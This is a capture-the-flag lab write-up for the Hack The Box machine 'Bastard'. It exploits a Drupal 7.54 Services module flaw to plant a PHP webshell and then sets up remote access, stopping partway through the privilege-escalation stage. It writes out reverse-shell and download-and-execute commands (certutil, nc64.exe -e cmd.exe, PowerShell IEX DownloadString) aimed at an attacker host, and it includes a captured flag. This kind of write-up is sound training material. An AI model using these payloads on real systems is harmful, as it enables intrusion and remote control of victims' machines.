---
description: 10.10.10.9
---

# Bastard

![](<../../.gitbook/assets/1 (7).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Drupal 7.x Module Services Remote Code Execution
* Root - Privesc can be done many ways, including any of the following Kernel exploits including MS10-059, MS14-040, MS15-051, or abusing the SeImpersonatePrivilege privilege to get escalation with juicypotato

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.9
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 05:02 EST
Nmap scan report for 10.10.10.9
Host is up (0.019s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 111.33 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -sC -A -p 80,135,49154 10.10.10.9
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 05:04 EST
Nmap scan report for 10.10.10.9
Host is up (0.016s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 49154/tcp)
HOP RTT      ADDRESS
1   16.71 ms 10.10.14.1
2   16.67 ms 10.10.10.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.92 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.9/ 
http://10.10.10.9/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to 10.10.10.9 | 10.10.10.9], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]

```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.9/ -C all 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.9
+ Target Hostname:    10.10.10.9
+ Target Port:        80
+ Start Time:         2021-12-08 05:07:53 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ARRAY(0x558cc8e12298)
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-generator' found, with contents: Drupal 7 (http://drupal.org)
+ Entry '/INSTALL.mysql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.pgsql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.sqlite.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/install.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/LICENSE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/MAINTAINERS.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/UPGRADE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/xmlrpc.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=comment/reply/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 68 entries which should be manually viewed.
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
^C                                                                                                                 

```

### Gobuster / Dirb

We tried using the above tools, but unfortunately they were just too slow, and therefore didnt yeald anything as we killed them after some time.

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* The site on port 80 is powered by Drupal
* There is a robots.txt with a lot of entries
  * /CHANGELOG.txt --> Drupal 7.54, 2017-02-01
  * /xmlrpc.php --> accepts POST requests only
  * /node/add --> forbidden

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Appears to be using standard template scripts, nothing useful found.

### Browsing

Let's check out the main page:

![](<../../.gitbook/assets/2 (3).JPG>)

We try a few basic logins without success:

> admin:admin
>
> admin:password
>
> admin:Password
>
> admin:bastard

Other than the login form, there isn't much else to investigate on the site.

## Searchsploit

Let's check the exploit database for any vulnerabilities against this version. We narrow down the search by excluding a bunch of unrequired entries to get the following list:

```
└─$ searchsploit drupal | grep 7 | grep -Ev 'Auth|4\.x|4\.7|5\.2|7\.12' 
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)              | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)               | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)    | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)    | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)       | php/webapps/35150.php
Drupal 7.x Module Services - Remote Code Execution                             | php/webapps/41564.php
Drupal < 7.34 - Denial of Service                                              | php/dos/35415.txt
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure              | php/webapps/44501.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site S | php/webapps/25493.txt
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                  | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting        | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flot | php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)              | php/remote/40130.rb
                                                                                   
```

The one that stands out based on the version information we have is the following exploit:

> Drupal 7.x Module Services - Remote Code Execution
>
> [https://www.exploit-db.com/exploits/41564](https://www.exploit-db.com/exploits/41564)

This is a PHP script that uses a SQL injection vulnerbility to grab cache contents  and the admin creds. The exploit is explained in great detail at the link provided in the exploit:

{% embed url="https://www.ambionics.io/blog/drupal-services-module-rce" %}

After reviewing the code, we notice that we'll need to make a few minor adjustments in order to use it against our target:

> $url = 'http://vmweb.lan/drupal-7.54';&#x20;
>
> $endpoint\_path = '/rest\_endpoint';&#x20;
>
> $endpoint = 'rest\_endpoint';
>
> 'filename' => 'rce.php',
>
> 'data' => '\<?php system($\_GET\["cmd"]); ?>'

Unfortunately, when we visit the page at [http://10.10.10.9/rest\_endpoint](http://10.10.10.9/rest\_endpoint) we get an error:

![](<../../.gitbook/assets/3 (6).JPG>)

## Drupwn

Let's run this tool to see if we can find any nodes.&#x20;

> Most content on a Drupal website is stored and treated as "nodes". A node is any piece of individual content, such as a page, poll, article, forum topic, or a blog entry. Comments are not stored as nodes but are always connected to one. Treating all content as nodes allows the flexibility to create new types of content. It also allows you to painlessly apply new features or changes to all content of one type.

{% embed url="https://www.drupal.org/docs/7/nodes-content-types-and-fields/about-nodes" %}

One of the options we can scan for are "nodes" using this tool, and so let's do that:

{% hint style="danger" %}
NOTE: When we ran the scan and left it for a while, it seemed to crash the target. It may be a conincidence, but the target seems to be quite slow anyway in general based on when we were browsing the site and the incredibly slow gobuster scan we ran.
{% endhint %}

```
└─$ python3 drupwn --mode enum --target http://10.10.10.9 --nodes --dfiles 

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/
    
[-] Version not specified, trying to identify it

[+] Version detected: 7.54                                                                                       
                                                                                                                 

============ Default files ============

[+] /README.txt (200)
[+] /robots.txt (200)
[+] /LICENSE.txt (200)
[+] /xmlrpc.php (200)
[+] /install.php (200)
[+] /update.php (403)

============ Nodes ============

http://10.10.10.9/node/1


```

In our case, when we ran the tool, after finding the node shown above, it basically got stuck and so we had to revert the box. We did find one node to check out though, which as it turns out, is enough:

![](<../../.gitbook/assets/4 (6).JPG>)

## Remote Code Execution (RCE)

Clicking on the "api\_test" link takes us to [http://10.10.10.9/rest](http://10.10.10.9/rest) and returns the following message in the browser:

> Services Endpoint "rest\_endpoint" has been setup successfully.&#x20;

This looks promising. We can now go back to our PHP script and update it as follows:

> $url = 'http://10.10.10.9';&#x20;
>
> $endpoint\_path = '/rest';&#x20;
>
> $endpoint = 'rest\_endpoint';
>
> 'filename' => 'rce.php',
>
> 'data' => '\<?php system($\_GET\["cmd"]); ?>'

Let's run it:

```
└─$ php 41564.php

Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/rce.php

```

Our file has been uploaded. Let's see if we have command execution on the target:

### RCE using a web browser

> [http://10.10.10.9/rce.php?cmd=whoami](http://10.10.10.9/rce.php?cmd=whoami)
>
> [http://10.10.10.9/rce.php?cmd=systeminfo](http://10.10.10.9/rce.php?cmd=systeminfo)

![](<../../.gitbook/assets/5 (1).JPG>)

![](<../../.gitbook/assets/6 (1).JPG>)

### RCE using curl

We can als use "curl" to run these commands from our terminal:

```
└─$ curl -X GET "http://10.10.10.9/rce.php?cmd=whoami"      
nt authority\iusr
                                                                                                                 
└─$ curl -X GET "http://10.10.10.9/rce.php?cmd=systeminfo"

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46
System Boot Time:          9/12/2021, 10:36:19
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.601 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.628 MB
Virtual Memory: In Use:    467 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
                                                          
```

## Gaining Access

Let's see what the current working cirectory is, which should be the webroot:

```
└─$ curl -X GET "http://10.10.10.9/rce.php?cmd=cd" 
C:\inetpub\drupal-7.54

```

Now that we know the current directory, let's see if we can upload a file to it. If successful, we should be able to place a PHP reverse shell script into the webroot and then access it to trigger the code execution. We could also poentially upload an ASP reverse shell script, however, we did not try it for this box.

The pentestmonkey script ([https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)) recently got an update which includes a nice clean Windows section. The refreshed version can be obtained from the following github repo:

{% embed url="https://github.com/ivan-sincek/php-reverse-shell" %}

Modify the script with your attack machine IP and the port you want o receive the shell on, and start a netcat listener:

```
└─$ nc -nvlp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999

```

We'll try and use the "certutil" windows tool that is included in most if not all Windows distributions in order to download our PHP script. The "curl" command we'll use is as follows:

> curl -X GET "http://10.10.10.9/rce.php?cmd=certutil.exe -urlcache -split -f http://10.10.14.10/rev.php C:\inetpub\drupal-7.54\rev.php"

The command does not work as is, and so we'll need to "URL encode" it. For this task, we used Cyberchef. Simply paste the payload into the input box, add the "URL Encode" operation to the "Recipe" and select the option to "Encode all special characters".

![](<../../.gitbook/assets/7 (2).JPG>)

Our final payload is as follows:

> curl -X GET "http://10.10.10.9/rce.php?cmd=certutil%2Eexe%20%2Durlcache%20%2Dsplit%20%2Df%20http%3A%2F%2F10%2E10%2E14%2E10%2Frev%2Ephp%20C%3A%5Cinetpub%5Cdrupal%2D7%2E54%5Crev%2Ephp"

Start a simple python3 web server to host our script:

```
└─$ sudo python3 -m http.server 80        
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Run the command which downloads the reverse shell script, and then access the page to trigger the code execution:

```
└─$ curl -X GET "http://10.10.10.9/rce.php?cmd=certutil%2Eexe%20%2Durlcache%20%2Dsplit%20%2Df%20http%3A%2F%2F10%2E10%2E14%2E10%2Frev%2Ephp%20C%3A%5Cinetpub%5Cdrupal%2D7%2E54%5Crev%2Ephp"
****  Online  ****
  0000  ...
  2457
CertUtil: -URLCache command completed successfully.
      
└─$ curl -X GET http://10.10.10.9/rev.php
                                                                                                                                                            
```

In our listener, we get a shell as "drupal":

```
└─$ nc -nvlp 9999                                                                                          130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49196.
SOCKET: Shell has connected! PID: 2748
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
iis apppool\drupal

C:\inetpub\drupal-7.54>
```

## Struggling with program execution

### User "iis apppool\drupal"

Looking around in the "Users" directory, we find the user flag:

```
C:\Users\dimitris\Desktop>type user.txt
ba22fde1932d06eb76a163d312f921a2
C:\Users\dimitris\Desktop>
```

Let's see if we can run powershell from within our reverse shell:

```
C:\inetpub\drupal-7.54>powershell
Windows PowerShell 
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

```

Unfortunately, it doesn't work, and also hangs our session. After reconnecting to the target, we check if we can run powershell commands, which we can, as shown below:

```
C:\inetpub\drupal-7.54>powershell $host.Version
powershell $host.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
2      0      -1     -1      

C:\inetpub\drupal-7.54>
```

Let's use "nc64.exe" to get a new shell. The windows binary can be downloaded from the following github repo:

{% embed url="https://github.com/int0x33/nc.exe" %}

Copy the binary to our working directory.&#x20;

Start a new netcat listener on port 8888 on our Kali machine.&#x20;

To transfer the binary, we'll use the "impacket smbserver" script which will start a service that listens on TCP 445.

{% embed url="https://github.com/SecureAuthCorp/impacket" %}

{% embed url="https://www.kali.org/tools/impacket" %}

```
└─$ sudo smbserver.py SHARE .                                                 
Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

We'll use our PHP command execution script with the following command to do the transfer.&#x20;

> curl -X GET "http://10.10.10.9/rce.php?cmd=\\\10.10.14.10\SHARE\nc64.exe -e cmd.exe 10.10.14.10 9999

The payload needs to be "URL encoded", and so we'll use "Cyberchef" again to do that.

> curl -X GET "http://10.10.10.9/rce.php?cmd=%5C%5C10%2E10%2E14%2E10%5CSHARE%5Cnc64%2Eexe%20%2De%20cmd%2Eexe%2010%2E10%2E14%2E10%209999"

Run the command:

```
└─$ curl -X GET "http://10.10.10.9/rce.php?cmd=%5C%5C10%2E10%2E14%2E10%5CSHARE%5Cnc64%2Eexe%20%2De%20cmd%2Eexe%2010%2E10%2E14%2E10%209999"

```

We get a hit on our SMB server:

```
[*] Incoming connection (10.10.10.9,55628)
[*] AUTHENTICATE_MESSAGE (\,BASTARD)
[*] User BASTARD\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Closing down connection (10.10.10.9,55628)
[*] Remaining connections []

```

We also get a shell in our listener:

```
└─$ rlwrap nc -nvlp 9999                                                                                   130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:65329.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\iusr

C:\inetpub\drupal-7.54>

```

Notice that we got a shell as a different user this time. This is because we are no longer running the PHP webshell, which was being run under the context of the "drupal" application account. Instead, we are now executing a command on the system, which is using the web user account that runs the web server and not the application on top of it.

### User "nt authority\iusr"

Let's see if we can run "winPEAS" on the target to enumerate the system for weaknesses.

Download and copy "winPEASx64.exe" to the current working directory in Kali.

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}

On the target, we can download Winpeas as follows using our SMB share:

```
C:\inetpub\drupal-7.54> copy \\10.10.14.10\SHARE\winPEASx64.exe
        1 file(s) copied.

```

When we try and run it, nothing happens:

```
C:\inetpub\drupal-7.54> .\winPEASx64.exe
C:\inetpub\drupal-7.54>
```

The reason we cannot run it is most likely because the version of ".Net" required is not installed.&#x20;

### .Net Versions

We can check which version/s of ".Net" is installed with the following command:

> reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s

```
C:\inetpub\drupal-7.54>reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727
    Install    REG_DWORD    0x1
    Version    REG_SZ    2.0.50727.4927
    Increment    REG_SZ    4927
    SP    REG_DWORD    0x2
    CBS    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1028
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1029
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1030
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1031
    OCM    REG_DWORD    0x1
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1032
    OCM    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1033
    Version    REG_SZ    2.0.50727.4927
    CBS    REG_DWORD    0x1
    Increment    REG_SZ    4927
    SP    REG_DWORD    0x2

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1035
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1036
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1038
    OCM    REG_DWORD    0x1
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1040
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1041
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1042
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1043
    OCM    REG_DWORD    0x1
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1044
    Install    REG_DWORD    0x1
    MSI    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1045
    OCM    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1046
    OCM    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1049
    Install    REG_DWORD    0x1
    MSI    REG_DWORD    0x1
    OCM    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1053
    OCM    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\1055
    OCM    REG_DWORD    0x1
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\2052
    OCM    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\2070
    Install    REG_DWORD    0x1
    OCM    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\3076
    OCM    REG_DWORD    0x1
    MSI    REG_DWORD    0x1
    Install    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v2.0.50727\3082
    OCM    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    MSI    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Net Framework Setup\NDP\v3.5
    SP    REG_DWORD    0x0


C:\inetpub\drupal-7.54>
```

We see that the target system has version "2.0.50727.4927" installed. At the time of writing this, "winPEAS" requires ".Net >= 4.5.2".&#x20;

### Shell upgrade to Powershell

Even as the "nt authority\iusr" user, we are still unable to change into a powershell shell in our reverse shell session. To do this, we'll use the same process as before, except, instead of transferring the file via SMB, we'll do the transfer via HTTP.

Start a new netcat listener.

Download the "Invoke-PowerShellTcp.ps1" script from the following github repo:

{% embed url="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" %}

Modify the powershell script to run the command by adding it to the end of the script as follows, and then save it.

> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 9999

Start a python3 webserver in the same directory as the powershell script:

```
└─$ sudo python3 -m http.server 80                                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

We'll use the following "curl" command via our PHP command execution script to download and run the powershell script:

> curl -X GET "http://10.10.10.9/rce.php?cmd=powershell IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1')"

We'll need to "URL encode" this as well:

> curl -X GET "http://10.10.10.9/rce.php?cmd=powershell%20IEX%28New%2DObject%20Net%2EWebclient%29%2EDownloadString%28%27http%3A%2F%2F10%2E10%2E14%2E10%2FInvoke%2DPowerShellTcp%2Eps1%27%29"

Run it:

```
└─$ curl -X GET "http://10.10.10.9/rce.php?cmd=powershell%20IEX%28New%2DObject%20Net%2EWebclient%29%2EDownloadString%28%27http%3A%2F%2F10%2E10%2E14%2E10%2FInvoke%2DPowerShellTcp%2Eps1%27%29"

```

In our listener, we get a powershell session:

```
└─$ rlwrap nc -nvlp 9999                                                                                   130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:65388.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
nt authority\iusr
PS C:\inetpub\drupal-7.54> 
```

Even with our powershell session, we are still unable to execute any programs from the shell due to lack of permissions. If we try and modify the execution policy, we get an error:

```
PS C:\inetpub\drupal-7.54>Set-ExecutionPolicy Unrestricted
PS C:\inetpub\drupal-7.54> Invoke-PowerShellTcp : Access to the registry key 'HKEY_LOCAL_MACHINE\SOFTWARE\
Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' is denied.
At line:128 char:21
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.14.10 -Port 9999
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
 

PS C:\inetpub\drupal-7.54>
```

Perhaps we can download and run a powershell script from within our session. Let's download "PowerUp.ps1" and copy it to our working directory, and start a python3 webserver:

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

In our powershell session, we get another error:

```
PS C:\inetpub\drupal-7.54> IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.10/PowerUp.ps1')
PS C:\inetpub\drupal-7.54> Invoke-PowerShellTcp : Cannot open Service Control Manager on computer '.'. Thi
s operation might require other privileges.
At line:128 char:21
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.14.10 -Port 9999
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
 

PS C:\inetpub\drupal-7.54>
```

We can also try and transfer an executable binary.



## Winpeas.bat

The "Winpeas" github repo also has a batch script which has less requirements than the binary executable does.

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat" %}

Transfer it using the SMB share, and run it:

```
PS C:\inetpub\drupal-7.54> copy \\10.10.14.10\SHARE\winPEAS.bat
PS C:\inetpub\drupal-7.54> .\winPEAS.bat

```

Unfortunately it hangs. Let's exit the powershell session, and get a new session using nc64.exe again:

